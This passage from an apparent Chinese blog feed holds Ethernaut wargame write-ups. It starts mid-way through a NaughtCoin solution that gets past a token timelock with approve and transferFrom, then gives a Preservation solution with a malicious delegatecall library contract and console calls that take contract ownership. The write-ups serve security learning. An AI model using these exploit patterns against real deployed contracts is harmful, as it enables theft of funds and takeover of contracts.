(10**uint256(decimals()));    // _totalSupply = INITIAL_SUPPLY;    // _balances[player] = INITIAL_SUPPLY;    _mint(player, INITIAL_SUPPLY);    emit Transfer(address(0), player, INITIAL_SUPPLY);  }    function transfer(address _to, uint256 _value) override public lockTokens returns(bool) {    super.transfer(_to, _value);  }  // Prevent the initial owner from transferring tokens until the timelock has passed  modifier lockTokens() {    if (msg.sender == player) {      require(now &gt; timeLock);      _;    } else {     _;    }  } } </code></pre><h2 id="合约分析："><a href="#合约分析：" class="headerlink" title="合约分析："></a>合约分析：</h2><p>根据题意，需要将自己的 balance 清空。合约里提供了 <code>transfer()</code> 函数来进行转账操作，但注意到有一个 modifier <code>lockTokens()</code>，限制了只有十年后才能调用 <code>transfer()</code> 函数。需要解题者 bypass it，注意到该合约是 <code>StandardToken</code> 的子合约，以上代码我们可以看出合约NaughtCoin继承了StandardToken但是没有对父合约做重写，导致利用父合约的函数可以进行及时转账。而子合约NaughtCoin也没有什么问题，那我们还是回过头来看看import的父合约 StandardToken.sol。题目中也给出了源码库地址与 ERC20 接口规范文档<br><a href="https://github.com/OpenZeppelin/zeppelin-solidity/tree/master/contracts">https://github.com/OpenZeppelin/zeppelin-solidity/tree/master/contracts</a><br><a href="https://github.com/ethereum/EIPs/blob/master/EIPS/eip-20.md">https://github.com/ethereum/EIPs/blob/master/EIPS/eip-20.md</a></p><p>在子合约中找不出更多信息的时候，把目光更多放到父合约和接口上，在接口规范里能看到，除了 <code>transfer()</code> 之外，还有 <code>transferFrom()</code> 函数也可以进行转账操作。重写transferFrom就是一个可利用的点。直接看看StandardToken.sol代码：</p><pre><code>contract StandardToken {    using ERC20Lib for ERC20Lib.TokenStorage;    ERC20Lib.TokenStorage token;    ...    function transfer(address to, uint value) returns (bool ok) {         return token.transfer(to, value);       }    function transferFrom(address from, address to, uint value) returns (bool ok) {         return token.transferFrom(from, to, value);       }    ...}</code></pre><p>跟进ERC20Lib.sol：</p><pre><code>library ERC20Lib {    ...    function transfer(TokenStorage storage self, address _to, uint _value) returns (bool success) {        self.balances[msg.sender] = self.balances[msg.sender].minus(_value);        self.balances[_to] = self.balances[_to].plus(_value);        Transfer(msg.sender, _to, _value);        return true;    }    function transferFrom(TokenStorage storage self, address _from, address _to, uint _value) returns (bool success) {        var _allowance = self.allowed[_from](msg.sender);        self.balances[_to] = self.balances[_to].plus(_value);        self.balances[_from] = self.balances[_from].minus(_value);        self.allowed[_from](msg.sender) = _allowance.minus(_value);        Transfer(_from, _to, _value);        return true;    }    ...    function approve(TokenStorage storage self, address _spender, uint _value) returns (bool success) {        self.allowed[msg.sender](_spender) = _value;        Approval(msg.sender, _spender, _value);        return true;    }}</code></pre><p>需要注意的是，与 <code>transfer()</code> 不同，调用 <code>transferFrom()</code> 需要 <code>msg.sender</code> 获得授权。由于我们本就是合约的 owner，可以自己给自己授权。授权操作在接口文档里也有</p><pre><code class="javascript">function approve(address _spender, uint256 _value) returns (bool success)</code></pre><p>此处可以直接调用这个transferFrom了。但是transferFrom有一步权限验证，要验证这个msg.sender是否被_from（实际上在这里的情景的就是自己是否给自己授权了），那么我们同时还可以调用approve 给自己授权。</p><p>部署完成后复制合约地址，直接在题目界面 console 操作，需要注意toWei语句表达方式，默认单位是ether</p><p><a href="http://cw.hubwiz.com/card/c/web3.js-1.0/1/8/24/">web3.js toWei</a></p><pre><code class="javascript">await contract.approve(player,web3.utils.toWei('1000000'))// 给自己授权await contract.transferFrom(player,contract.address,web3.utils.toWei('1000000'))// 向刚部署的第三方合约转钱，清空 player 的 balance</code></pre><h2 id="攻击流程："><a href="#攻击流程：" class="headerlink" title="攻击流程："></a>攻击流程：</h2><p>1、获取实例，查看一下当前账户余额，可以看到是25位，那么我们允许的是就是1000000ether，</p><p><img src="https://raw.githubusercontent.com/kdlwtrdrgm/kdlwtrdrgm.github.io/img/image-20210729132832063.png"></p><p>2、使用approve进行授权</p><p><img src="https://raw.githubusercontent.com/kdlwtrdrgm/kdlwtrdrgm.github.io/img/image-20210729132958527.png"></p><p>3、通过transferFrom来实施转账，注意默认单位是ether，别出错</p><p><img src="https://raw.githubusercontent.com/kdlwtrdrgm/kdlwtrdrgm.github.io/img/image-20210729133054558.png" alt="image-20210729133054558"></p><p><img src="https://raw.githubusercontent.com/kdlwtrdrgm/kdlwtrdrgm.github.io/img/image-20210729133200014.png"></p><p>4、查看余额，钱包中的代币消失了，快乐提交</p><p><img src="https://raw.githubusercontent.com/kdlwtrdrgm/kdlwtrdrgm.github.io/img/image-20210729133218542.png"></p><p><img src="https://raw.githubusercontent.com/kdlwtrdrgm/kdlwtrdrgm.github.io/img/image-20210729133241089.png"></p>]]></content>
+    
+    
+    <summary type="html">第15关</summary>
+    
+    
+    
+    <category term="Ethernaut" scheme="https://kdlwtrdrgm.github.io/categories/Ethernaut/"/>
+    
+    
+    <category term="靶场" scheme="https://kdlwtrdrgm.github.io/tags/%E9%9D%B6%E5%9C%BA/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>Preservation第16关练习</title>
+    <link href="https://kdlwtrdrgm.github.io/Ethernaut/16.Ethernaut-Preservation/"/>
+    <id>https://kdlwtrdrgm.github.io/Ethernaut/16.Ethernaut-Preservation/</id>
+    <published>2021-07-18T11:28:00.000Z</published>
+    <updated>2021-08-02T08:27:30.400Z</updated>
+    
+    <content type="html"><![CDATA[<h1 id="Preservation第16关练习"><a href="#Preservation第16关练习" class="headerlink" title="Preservation第16关练习"></a>Preservation第16关练习</h1><h2 id="要求："><a href="#要求：" class="headerlink" title="要求："></a>要求：</h2><p>此合同使用库存储两个不同时区的两个不同时间，构造函数为每次要存储的库创建两个实例。 而玩家的目标是获取合约的owner权限。</p><h2 id="合约代码："><a href="#合约代码：" class="headerlink" title="合约代码："></a>合约代码：</h2><pre><code class="solidity">// SPDX-License-Identifier: MITpragma solidity ^0.6.0;contract Preservation {  //公共图书馆合约  address public timeZone1Library;  address public timeZone2Library;  address public owner;   uint storedTime;  //设置delegatecall的函数签名  bytes4 constant setTimeSignature = bytes4(keccak256("setTime(uint256)"));  constructor(address _timeZone1LibraryAddress, address _timeZone2LibraryAddress) public {    timeZone1Library = _timeZone1LibraryAddress;     timeZone2Library = _timeZone2LibraryAddress;     owner = msg.sender;  }   //设置时区1的时间  function setFirstTime(uint _timeStamp) public {    timeZone1Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp));  }  //设置时区2的时间  function setSecondTime(uint _timeStamp) public {    timeZone2Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp));  }}//简单的图书馆合同来设定时间contract LibraryContract {  //存储时间戳  uint storedTime;    function setTime(uint _time) public {    storedTime = _time;  }}</code></pre><h2 id="合约分析："><a href="#合约分析：" class="headerlink" title="合约分析："></a>合约分析：</h2><p>先回忆一下</p><pre><code>call()当使用方法是：require(msg.sender.call.value(_weiToWithdraw)());则作用是将_weiToWithdraw个以太币发送给msg.sender地址，并且调用msg.sender地址的fallback函数当使用方法是：bytes4 methodId = bytes4(keccak256("increaseAge(string,uint)"));//函数hashaddr.call(methodId,"jack",1);那就是调用了函数increaseAge，并且传入参数是"jack",1</code></pre><p><code>call()</code>的返回结果是一个<code>bool</code>，表示是否成功的调用，或者是失败引起了EVM异常。该方法无法直接访问函数返回结果(因为需要事前知道编码和返回结果大小)。</p><p><code>call()</code>的返回结果即使成功，并不能说操作成功了，只是没有出现异常，比如我们第一个例子中，实际是调用到了<code>fallback()</code>函数。</p><h2 id="delegatecall"><a href="#delegatecall" class="headerlink" title="delegatecall()"></a>delegatecall()</h2><p><code>call</code>与<code>delegatecall</code>的功能类似，区别仅在于后者仅使用给定地址的代码，其它信息则使用当前合约(如存储，余额等等)。</p><p>函数的设计目的是为了使用存储在另一个合约的库代码。</p><p>二者执行代码的上下文环境的不同，当使用call调用其它合约的函数时，代码是在被调用的合约的环境里执行，对应的，使用delegatecall进行函数调用时代码则是在调用函数的合约的环境里执行</p><p>三种调用方式的异同点</p><ul><li><p>call: 最常用的调用方式，调用后内置变量 msg 的值会修改为调用者，执行环境为被调用者的运行环境(合约的 storage)。</p></li><li><p>delegatecall: 调用后内置变量 msg 的值不会修改为调用者，但执行环境为调用者的运行环境。</p></li><li><p>callcode: 调用后内置变量 msg 的值会修改为调用者，但执行环境为调用者的运行环境。</p></li></ul><p>考虑以下因素：</p><ol><li>Preservation 调用 setTime 的时候，修改的是 Preservation 的存储空间，而非 LibraryContract 的。</li><li>setTime 执行的时候，会对 uint 类型的 storedTime 赋值，这实际意味着对存储空间中的 slot 0 进行赋值。</li><li>Preservation 存储空间中 slot 0 存储的是 timeZone1Library，也就是调用 setTime 将会导致 timeZone1Library 被修改。</li></ol><p>综合以上 3 点，我们可以将 timeZone1Library 替换为攻击合约。攻击合约沿用上面的思路，构建一个新的 LibraryContract，该合约在调用 setTime 的时候，会修改存储空间中 slot 2 的值（Preservation 的 slot 2 存储的是 owner）。攻击合约如下：</p><pre><code>pragma solidity ^0.4.25;contract PreservationPoc {  address public timeZone1Library;  address public timeZone2Library;  address public owner;   uint storedTime;  function setTime(uint _time) public {    owner = address(_time);  }}</code></pre><h2 id="攻击流程："><a href="#攻击流程：" class="headerlink" title="攻击流程："></a>攻击流程：</h2><p>1、获取实例</p><p><img src="https://raw.githubusercontent.com/kdlwtrdrgm/kdlwtrdrgm.github.io/img/image-20210729141318817.png"></p><p>2、在remix中部署恶意合约<img src="https://raw.githubusercontent.com/kdlwtrdrgm/kdlwtrdrgm.github.io/img/image-20210729141430175.png">3、在控制台执行一下命令：（恶意合约地址就在部署那里)<img src="https://raw.githubusercontent.com/kdlwtrdrgm/kdlwtrdrgm.github.io/img/image-20210729142638892.png"></p><pre><code>await contract.setSecondTime('恶意合约地址')await contract.setFirstTime('player地址')</code></pre><p><img src="https://raw.githubusercontent.com/kdlwtrdrgm/kdlwtrdrgm.github.io/img/image-20210729141749245.png"></p><p>4、这时候合约的拥有者就成了我们自己</p><p><img src="https://raw.githubusercontent.com/kdlwtrdrgm/kdlwtrdrgm.github.io/img/image-20210729141818990.png"></p><p>5、快乐提交</p><p><img src="https://raw.githubusercontent.com/kdlwtrdrgm/kdlwtrdrgm.github.io/img/image-20210729141942972.png"></p>]]></content>
+    
+    
+    <summary type="html">第16关</summary>
+    
+    
+    
+    <category term="Ethernaut" scheme="https://kdlwtrdrgm.github.io/categories/Ethernaut/"/>
+    
+    
+    <category term="靶场" scheme="https://kdlwtrdrgm.github.io/tags/%E9%9D%B6%E5%9C%BA/"/>
+    
+  </entry>
+  
+</feed>
